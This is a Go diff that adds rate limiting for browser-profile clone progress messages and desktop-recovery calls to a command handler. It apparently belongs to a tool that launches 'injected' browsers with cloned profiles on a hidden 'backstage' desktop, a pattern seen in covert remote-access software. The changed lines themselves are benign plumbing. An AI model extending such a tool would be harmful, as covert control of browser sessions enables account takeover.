@@ -45,6 +45,22 @@ var (
 	fileHashSlots         = make(chan struct{}, 2)
 )
 
+const cloneProgressMinInterval = 100 * time.Millisecond
+
+type cloneProgressLimiter struct {
+	lastSent time.Time
+}
+
+func (l *cloneProgressLimiter) allow(now time.Time, copiedBytes int64, status string) bool {
+	initial := status == "scanning" || (status == "cloning" && copiedBytes == 0)
+	terminal := status == "done" || strings.HasPrefix(status, "done_with_errors|")
+	if !initial && !terminal && !l.lastSent.IsZero() && now.Sub(l.lastSent) < cloneProgressMinInterval {
+		return false
+	}
+	l.lastSent = now
+	return true
+}
+
 type backstageInputKind int
 
 const (
@@ -1117,6 +1133,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				VirtualMode = v
 			}
 		}
+		capture.RequestDesktopRecoveryAfterBackstageStart()
 		if VirtualMode {
 			env.VirtualMu.Lock()
 			if env.VirtualCancel != nil {
@@ -2063,7 +2080,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		goSafe("backstage_start_browser_injected", nil, func() {
 			var onProgress capture.CloneProgressFunc
 			if clone {
+				var limiter cloneProgressLimiter
 				onProgress = func(percent int, copiedBytes, totalBytes int64, status string) {
+					if !limiter.allow(time.Now(), copiedBytes, status) {
+						return
+					}
 					_ = wire.WriteMsg(context.Background(), env.Conn, wire.BackstageCloneProgress{
 						Type:        "backstage_clone_progress",
 						Browser:     browser,
@@ -2106,6 +2127,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				autoStartExplorer = v
 			}
 		}
+		capture.RequestDesktopRecoveryAfterBackstageStart()
 		env.VirtualMu.Lock()
 		if env.VirtualCancel != nil {
 			env.VirtualCancel()
